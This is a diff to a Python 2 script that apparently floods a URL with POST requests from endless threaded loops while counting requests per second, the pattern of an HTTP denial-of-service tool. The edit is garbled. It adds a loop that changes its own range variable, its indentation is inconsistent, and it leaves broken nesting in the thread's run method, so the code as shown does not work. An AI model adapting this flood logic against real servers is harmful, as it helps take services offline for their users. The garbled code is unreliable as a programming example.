@@ -90,6 +90,10 @@ def httpcall(url):
 	request.add_header('Host',host)
 	request.get_method = lambda: "POST"
 	try:
+		for i in range(bytes):
+			bytes += 65535
+				
+			print "Rps: %d" % bytes
 			urllib2.urlopen(request)
 	except socket.error as e:
 			#print e.code
@@ -109,11 +113,9 @@ class HTTPThread(threading.Thread):
 	def run(self):
 		try:
 			while True:
-				bytes += 65535
-				for i in range(bytes):
-					bytes += 65535
+				
 					code=httpcall(url)
-					print "Rps: %d" % bytes
+					
 					
 				
 				
